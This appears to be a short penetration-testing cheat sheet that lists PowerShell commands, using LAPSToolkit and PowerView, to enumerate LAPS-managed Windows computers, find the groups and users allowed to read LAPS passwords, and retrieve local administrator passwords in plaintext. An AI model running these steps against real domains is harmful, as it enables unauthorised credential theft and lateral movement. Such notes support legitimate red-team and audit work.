---
title: LAPS
layout: default
parent: Windows Credentials
nav_order: 2
---

1. Run in powershell:
`Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted`

2. Import LAPS script:
`Import-Module .\LAPSToolkit.ps1`

3. Check which computer under LAPS:
`Get-LAPSComputers`

4. Check which user can read the LAPS password:
`Find-LAPSDelegatedGroups`

5. Use PowerView to find the users (eg if results under 4 is corp1\LAPS Password Readers):
`Get-NetGroupMember -GroupName "LAPS Password Readers"`

6. If logged in as these users run this to get plaintext password:
`Get-LAPSComputers`